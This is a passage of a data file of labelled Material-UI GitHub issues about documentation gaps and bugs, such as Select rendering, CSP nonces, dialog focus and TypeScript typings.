`@material-ui/styles` if material-ui is used?\r\n\r\nAlso according to the [Minimizing Bundle Size Guide](https://material-ui.com/guides/minimizing-bundle-size/), anything below 2nd level import is considered private and can cause module duplication in your bundle. So should I import `makeStyles` like this to minimize bundle size?\r\n```jsx\r\nimport makeStyles from '@material-ui/core/styles/makeStyles';\r\n```"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nIn the Sorting and Selecting Table demo of the docs page, the header action icon is using a class for text:\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/pages/components/tables/EnhancedTable.js#L176\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nThe Icon and Tooltip is not using the `color` specified in `<div className={classes.actions}>`\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nPage not found\r\n[https://v4-2-1.material-ui.com/customization/theming/#theme-provider](https://v4-2-1.material-ui.com/customization/theming/#theme-provider)\r\n![Screenshot from 2019-10-09 21-40-50](https://user-images.githubusercontent.com/32242596/66499528-a0535a80-eadd-11e9-8879-1d716532a29c.png)\r\n\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] The issue is present in the latest release.\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n404\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Visit https://v4-2-1.material-ui.com/customization/theming/#theme-provider\r\n\r\n\r\n## Context 🔦\r\nProblem with netlify `_redirects`\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\nWeb -> Chrome 77\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nthere are two typo in ButtonGroup API. CSS section, ButtonText groupedTextPrimary, groupedTextSecondary description must be variant=\"text\". "},{"labels":[null,"documentation",null,null],"text":"Select component's onChange is work, but it cannot render selected value.\r\n\r\n```javascript\r\nimport React, { useState } from 'react';\r\nimport InputLabel from '@material-ui/core/InputLabel';\r\nimport Select from '@material-ui/core/Select';\r\nimport MenuItem from '@material-ui/core/MenuItem';\r\n\r\nexport default function Test() {\r\n  const [test, setTest] = useState({\r\n    a: '',\r\n    b: '',\r\n    sum: {\r\n      name: '',\r\n    },\r\n  });\r\n\r\n  const option = [{ na: 'aa', nb: 'bb' }, { na: 'cc', nb: 'dd' }, { na: 'ee', nb: 'gg' }];\r\n\r\n  const handleTestChange = e => {\r\n    e.preventDefault();\r\n    setTest({\r\n      ...test,\r\n      a: e.target.value.na,\r\n      b: e.target.value.nb,\r\n      sum: {\r\n        ...test.sum,\r\n        name: `${e.target.value.na} vs ${e.target.value.nb}`,\r\n      },\r\n    });\r\n  };\r\n\r\n  return (\r\n    <div>\r\n      <h1>test</h1>\r\n      <h5>{test.sum.name}</h5>\r\n      <InputLabel>Preview test</InputLabel>\r\n      <Select value={test.sum.name} onChange={handleTestChange}>\r\n        {option.map(option => (\r\n          <MenuItem\r\n            key={`${option.na + option.nb}`}\r\n            value={{ na: option.na, nb: option.nb }}\r\n          >{`${option.na} vs ${option.nb}`}</MenuItem>\r\n        ))}\r\n      </Select>\r\n    </div>\r\n  );\r\n}\r\n```\r\n\r\nresult like that\r\n<img width=\"445\" alt=\"iss\" src=\"https://user-images.githubusercontent.com/50057548/66281182-b5b56280-e8ec-11e9-99d3-e51078d577ab.png\">\r\n\r\nalso develop tool didn't pop any error or warning"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nWhen we add a chip with MatherialUI icon (e.g. `<Phone/>` from `'@material-ui/icons'`) all works fine.\r\nBut when we'd add a chip with custom icon (e.g. from **Font Awesome**) inside the Icon component (`Icon` from `'@material-ui/core'`) we see that the icon looks a bit ugly.\r\n\r\nExamples here: https://codesandbox.io/s/material-ui-n4nhw?fontsize=14\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nI expect that all of a another icons will looks like a MU icons.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Create \r\n`<Chip icon={<Phone />} label=\"test\"/>` \r\nand \r\n`<Chip icon={<Icon className=\"fas fa-phone-alt\"/>}  label=\"test\"/>`\r\n2. Compare their icons.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI'm just trying to use chips with FA's icons.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.5.0  |\r\n| React       |  16.10.1  |\r\n| Browser     | FF 70.0b11, Google Chrome 76.0.3809.100  |\r\n| TypeScript  | 3.6.3  |\r\n| Fontawesome  | 5.11.2   |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the feature in the Title above -->\r\nBest practice for tables is to provide a caption or aria label for user context when using a screenreader. Screen readers read the caption or name of the table when user navigate to the table, giving users a sense of what the table is about. The caption element is the most straightforward way to give a name to a table, but it is also possible to use aria-label or aria-labelled by. \r\nhttps://www.w3.org/WAI/tutorials/tables/caption-summary/\r\nhttps://dequeuniversity.com/checklists/web/tables\r\n\r\nIn this case, to avoid having to impose a specific style on developers using an MUI table, a useful option would be to provide an optional ariaLabelledBy prop that is applied to the inner `<table>` tag, such that developers can show or hide a caption visually as necessary.\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\n<!-- Describe how it should work. -->\r\nDevelopers should be able to specify a caption for implementations of MUI `<Table>`. \r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\nMUI Table: https://material-ui.com/components/tables/\r\nExample using aria-describedBy\r\nhttps://www.w3.org/WAI/tutorials/tables/caption-summary/#using-aria-describedby-to-provide-a-table-summary\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nThis can be particularly important in cases where multiple tables are in use on a screen. On a page with multiple tables, screen reader users can pull up a list of all tables on the web page, which will show the captions along with the table size. \r\n"},{"labels":["documentation",null],"text":"My understanding is that a `children` prop should always be explicitly listed in the API docs whether or not it is supported (if not supported, `type` is specified as `unsupportedProp`, e.g. [BottomNavigationAction](https://material-ui.com/api/bottom-navigation-action/)).\r\n\r\nThe following components do not have a `children` prop, and it is therefore unclear from the API docs whether or not they support children. I know several of them do support children. To ensure consistency and make the API docs more self-sufficient, I propose that 1) a `children` prop is added to the components that support children, and 2) a `children` prop with `type = unsupportedProp` is added to the components that do not support children. (I am personally [impacted by](https://github.com/cmeeren/Feliz.MaterialUI/issues/20) the first point since I use the docs to generate F#/Fable bindings for MUI.)\r\n\r\n* [Card](https://material-ui.com/api/card/)\r\n* [CardContent](https://material-ui.com/api/card-content/)\r\n* [CardHeader](https://material-ui.com/api/card-header/)\r\n* [Checkbox](https://material-ui.com/api/checkbox/)\r\n* [CircularProgress](https://material-ui.com/api/circular-progress/)\r\n* [Divider](https://material-ui.com/api/divider/)\r\n* [FilledInput](https://material-ui.com/api/filled-input/)\r\n* [FormControlLabel](https://material-ui.com/api/form-control-label/)\r\n* [GridListTileBar](https://material-ui.com/api/grid-list-tile-bar/)\r\n* [Input](https://material-ui.com/api/input/)\r\n* [InputBase](https://material-ui.com/api/input-base/)\r\n* [LinearProgress](https://material-ui.com/api/linear-progress/)\r\n* [MobileStepper](https://material-ui.com/api/mobile-stepper/)\r\n* [OutlinedInput](https://material-ui.com/api/outlined-input/)\r\n* [Radio](https://material-ui.com/api/radio/)\r\n* [Rating](https://material-ui.com/api/rating/)\r\n* [Skeleton](https://material-ui.com/api/skeleton/)\r\n* [Slider](https://material-ui.com/api/slider/)\r\n* [SnackbarContent](https://material-ui.com/api/snackbar-content/)\r\n* [SpeedDialAction](https://material-ui.com/api/speed-dial-action/)\r\n* [SpeedDialIcon](https://material-ui.com/api/speed-dial-icon/)\r\n* [StepConnector](https://material-ui.com/api/step-connector/)\r\n* [StepIcon](https://material-ui.com/api/step-icon/)\r\n* [SwipeableDrawer](https://material-ui.com/api/swipeable-drawer/)\r\n* [Switch](https://material-ui.com/api/switch/)\r\n* [TablePagination](https://material-ui.com/api/table-pagination/)\r\n* [TextAreaAutosize](https://material-ui.com/api/textarea-autosize/)\r\n* [TextField](https://material-ui.com/api/text-field/)\r\n* [TouchRipple](https://material-ui.com/api/touch-ripple/)"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nThe [example from the docs](https://material-ui.com/guides/composition/#list) for composing react-router and material-ui Lists does not work without compile errors. (using my project's version of dependencies which are supposed to be compatible with material-ui)\r\n\r\n\r\n\r\nI found some related issues to this, but they don't seem to be for the `ListItem` component.\r\n\r\nRelated:\r\n- https://github.com/mui-org/material-ui/issues/15827\r\n- https://github.com/mui-org/material-ui/issues/16846\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n![image](https://user-images.githubusercontent.com/2476733/65920742-e4dc4900-e3ad-11e9-9ac5-fe231fc13d75.png)\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\nThere should be an example of how to use material-ui and react-router together that doesn't have compile errors.\r\n\r\nOr... If there's specific versions that are required, they should be documented.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nNote: It takes a few minutes for the type error to show up in the browser editor.\r\n\r\nhttps://codesandbox.io/s/material-demo-coinv\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nIt seems like this should be a very common use case. People trying to build a nav which is a list of links. Maybe I'm missing something.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | 4.4.3  |\r\n| React       |     16.8.6    |\r\n| TypeScript  |    3.4.4     |\r\n| react-router-dom        | 5.0.1         |\r\n"},{"labels":["documentation"],"text":"## Summary 💡\r\n\r\nhttps://github.com/mui-org/material-ui/blob/master/docs/src/pages.js#L19-L123 uses sometimes singular sometimes plural for the name of items:\r\n\r\nSelects vs Progress for example. Use singular name everywhere.\r\n\r\nAlso add Dropdown alias for Select item. Like \"Select (Dropdown)\" or \"Select / Dropdown\"\r\n![image](https://user-images.githubusercontent.com/19698636/65916668-08b38500-e3d6-11e9-8034-afda45c32b50.png)\r\n\r\n\r\n## Examples 🌈\r\n\r\n<!--\r\n  Provide a link to the Material design specification, other implementations,\r\n  or screenshots of the expected behavior.\r\n-->\r\n\r\n## Motivation 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has the lack of this feature affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen I visit [https://material-ui.com/#/](https://material-ui.com/#/) it redirects me to [https://v0.material-ui.com/#/](https://v0.material-ui.com/#/) every time\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nI don't want to be redirected to the old version.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Visit [https://material-ui.com/#/](https://material-ui.com/#/)\r\n\r\n## Your Environment 🌎\r\n\r\nI'm using stable Chrome 77.0.3865.90 (Official Build) (64-bit) on CentOS 7\r\nCookies for material-ui only have Google Analytics. Opening in Incognito mode results in the same behavior.\r\n"},{"labels":[null,"documentation"],"text":"If `Select` uses FormControl context it should be added in the list of the components here: https://material-ui.com/api/form-control/#import"},{"labels":["documentation",null,null,null],"text":"- [X] The issue is present in the latest release.\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nDemo: https://codesandbox.io/embed/gifted-bohr-cxrdm\r\n\r\nChrome:\r\n`useMediaQuery('print')` matches only when print is started with `Ctrl+P` or `Print` chosen from browser's menu. When print is started from `window.print` method - it doesn't match. (See headings on sample.)\r\n\r\nFirefox: \r\n`useMediaQuery('print')` never matches.\r\n\r\n## Expected Behavior 🤔\r\n\r\nI expect to `useMediaQuery('print')` to match for all \"printing situations\", regardless it is started from \"browser user action\" or \"programmatically\". And it should work on Firefox in general.\r\nIn attached demo - I expect to have \"This should be hidden with useMediaQuery.\" paragraph to be hidden in all \"printing situations\".\r\n\r\n## Steps to Reproduce 🕹\r\nSee demo: https://codesandbox.io/embed/gifted-bohr-cxrdm\r\nTry to print via browser (`Ctrl+P` or `Print` from main menu) or via button \"print via window.print\" to see how it behaves.\r\n\r\n## Context 🔦\r\n\r\nI'm trying to hide some elements for printing. Some blocks may be wrapped with `<Box displayPrint=\"none\">` - and it works. Sometimes I need to have \"lower level\" flag determining if this is print view, so I want to utilize `useMediaQuery('print')` - to avoid adding extra `div`s to DOM (what `Box` does).\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.4.3  |\r\n| React       |  16.8.4       |\r\n| Browser     |  Firefox 69.0.1, Chrome 77.0.3865.90    |\r\n"},{"labels":[null,"documentation",null,null],"text":" - [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nIn this example: https://material-ui.com/components/selects/, you see on the first select component:\r\n1) No option is selected\r\n2) Even though options are loaded in the select component.\r\n\r\nThis is good and desired behavior. But this is only possible if user had set \r\n\r\n```\r\n const [values, setValues] = React.useState({\r\n    age: '',\r\n    name: 'hai',\r\n  });\r\n\r\n```\r\n\r\n`age` to empty string above (even though from the options none of the menu items had '' as value).\r\n\r\nSo it seems in react material setting value of select to empty string means that none of the provided options are selected - **this is good, but nowhere does the documentation mentions this.**\r\n\r\nSo can you add to the documentation that if you provide empty string as value to the Select, then none of the provided options will be selected?\r\n\r\n(Otherwise I had weird issues today when the `InputLabel` was showing incorrectly when I initially forgot to specify empty string as value)"},{"labels":["documentation",null,null],"text":"First of all, thank you for Material UI - I love it; it's super cool!\r\n\r\nI've been looking into how to support CSP with Material UI; specifically using a [`style-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src). I've been reading the docs here: https://material-ui.com/styles/advanced/#content-security-policy-csp\r\n\r\nThey start off great but I must confess to getting a little lost by the end.  Having spent a bunch of time googling and seeing others who also seem to be a little confused. \r\n\r\nSee:\r\n- this stack overflow question: https://stackoverflow.com/questions/49125561/how-can-i-set-a-nonce-in-material-ui-for-the-content-security-policy \r\n- this hacker news discussion for instance: https://news.ycombinator.com/item?id=19069255 \r\n- github issue: https://github.com/slackhq/csp-html-webpack-plugin/issues/38 \r\n- https://github.com/cssinjs/jss/issues/814\r\n\r\nI thought I'd see if I could start a discussion with the desire of discovering the answer and hopefully using that to subsequently improving the docs 🤗 \r\n\r\nThe part where the docs start to get a little mysterious is here:\r\n\r\n> Then, you must pass this nonce to JSS so it can add it to subsequent <style> tags. The client-side gets the nonce from a header. You must include this header regardless of whether or not SSR is used.\r\n>\r\n> `<meta property=\"csp-nonce\" content={nonce} />`\r\n\r\nThis is not particularly clear to me; the \"you must pass this nonce to JSS\".  How exactly does this happen?  Is the idea that our `page.html` should include this `meta` property in the head?   Like this:\r\n\r\n```\r\n<head>\r\n<meta property=\"csp-nonce\" content=\"123354-i-am-a-nonce\" />\r\n</head>\r\n```\r\n\r\nAnd that JSS looks for a `csp-nonce` meta property by default? \r\n\r\ni.e. There's no need to write a line of code that says \"hey JSS, this is the nonce you need\", rather that JSS will by convention look for the `csp-nonce` meta property in your `html>head` when it boots and use the value as a nonce if it is found.\r\n\r\nOr am I totally barking up the wrong tree?  Totally possible!\r\n\r\nIt's worth saying that the JSS docs are similarly somewhat ambiguous: https://cssinjs.org/csp/?v=v10.0.0\r\n\r\nFinally I'm wondering whether it's worth mentioning approaches around hashing in the docs:\r\n\r\nhttps://github.com/slackhq/csp-html-webpack-plugin\r\n\r\nI don't know enough around this topic to say though."},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x ] The issue is present in the latest release.\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nUsing the create-react-app example:\r\n1) Download the example or clone the repo\r\n2) npm install\r\n3) npm start\r\n\r\nnpm start throws the following error in Windows 10: \r\n> create-react-app@4.0.0 start C:\\Users\\janit\\Desktop\\create-react-app\r\n> SKIP_PREFLIGHT_CHECK=true react-scripts start\r\n\r\n'SKIP_PREFLIGHT_CHECK' is not recognized as an internal or external command,\r\noperable program or batch file.\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nnpm starts the react app\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n(On Windows 10)\r\nUsing the create-react-app example:\r\n1. Download the example or clone the repo\r\n2. npm install\r\n3. npm start\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.4.3  |\r\n| React       |  v16.9.0  |\r\n| Browser     |    Chrome     |\r\n| TypeScript  |   No      |\r\n| etc.        | Windows 10        |\r\n"},{"labels":[null,null,null,"documentation",null],"text":"This bug was introduced by https://github.com/mui-org/material-ui/pull/16585\r\n\r\n\r\n<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nWhen an dialog is open, it steals the focus.\r\n\r\n![mui-focus-bug](https://user-images.githubusercontent.com/13392042/65310873-8930e500-db8f-11e9-87ec-b0058ae0b91a.gif)\r\n\r\n(At the end of the gif I can focus the editor again, but I think that's because of a hot-update of codesandbox, which interrupts the focus loop of the dialog.)\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\nWhen the dialog is open, I can focus unrelated parts of the tab (e.g. in an iframe).\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\non sandbox (https://codesandbox.io/s/cllze)\r\n\r\n1. open simple dialog\r\n2. try to focus the editor, after 200ms the focus will lost, so you cannot inoput something in the editor\r\n\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\n## Context 🔦\r\n\r\nI stumbled across it because I use a payment service provider that loads an iframe with an embedded modal where the customer can then make the payment. Unfortunately, this was no longer possible since release 4.3.0, as the input fields of the payment service provider immediately lost focus. Since there was no error message, it was only noticed when a customer reported the error.\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | since v4.3.3 (https://github.com/mui-org/material-ui/pull/16585)  |\r\n\r\n"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThis is related to #10357. When declaring the props interface for a given component, the current recommendation in the docs (https://material-ui.com/guides/typescript/#usage-of-withstyles) is: \r\n\r\n```ts\r\nimport { WithStyles, createStyles } from '@material-ui/core';\r\n\r\nconst styles = (theme: Theme) => createStyles({\r\n  root: { /* ... */ },\r\n  paper: { /* ... */ },\r\n  button: { /* ... */ },\r\n});\r\n\r\ninterface Props extends WithStyles<typeof styles> {\r\n  foo: number;\r\n  bar: boolean;\r\n}\r\n```\r\n\r\nHowever, this creates a bit of an issue if you export the `Props` interface to be used by other modules. For example:\r\n\r\n```ts\r\nconst foo: Props = {\r\n  foo: 42,\r\n  bar: true,\r\n};\r\n```\r\n\r\nresults in an error:\r\n\r\n```\r\nProperty 'classes' is missing in type '{ foo: number; bar: true; }' but required in type 'Props'.ts(2741)\r\n```\r\n\r\nI understand the reasoning for wanting it to be a required property from the internal component perspective so that the component knows it will always have a `classes` prop provided, but from an external component API perspective it makes it quite clunky to use. For example if i had another component and followed a typical MUI convention:\r\n\r\n```ts\r\ninterface OtherProps {\r\n\tChildComponentProps?: Props;\r\n}\r\n```\r\n\r\nit would require the consumer to provide a `classes` property if they specified the `ChildComponentProps` prop.\r\n\r\nWe've worked around this in our applications by creating a new type called `WithStylesPublic` that is a copy of `WithStyles` but makes the `classes` property optional. Then we use it like so:\r\n\r\n```ts\r\ninterface Props extends WithStylesPublic<typeof styles> {\r\n  foo: number;\r\n  bar: boolean;\r\n}\r\n\r\nconst Component: React.FC<Props & WithStyles<typeof styles>> = ({ classes, ...other }) => { ... }); \r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\nNot sure on the best solution here. Should MUI provide an interface similar to what i've described with `WithStylesPublic` that has classes optional? Should this just be documentation? If so it leaves the burden on the developer to work around this case.\r\n\r\n## Context 🔦\r\n\r\nWe have had great success creating an internal component library that wraps the MUI components and re-exports them. In some cases we like to add additional functionality to those components such as new props, but in those cases we run into the issues described above.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.4.2  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |    v3.6.2     |\r\n| etc.        |         |\r\n"},{"labels":["documentation"],"text":"* google.com: [\"material-ui.com icons\"](https://www.google.com/search?q=material-ui.com+icons&oq=material-ui.com+icons&aqs=chrome.0.69i59j0l2j69i60l3.3300j0j4&sourceid=chrome&ie=UTF-8) includes english, frensh and german in the top 3 results\r\n* duckduckgo.com [\"material-ui.com icons\"](https://duckduckgo.com/?q=material-ui.com+icons&t=h_&ia=web) does not list any other languages\r\n\r\nSince those languages are only not-ssr for a couple of days (as a result of #17249) duckduckgo might not have caught up already.\r\n\r\nI have some ideas that should improve the build times. In the end the it might make more sense to just throw some more CPUs at the build."},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\nEncountering unexpected runtime error at [`Color tool` 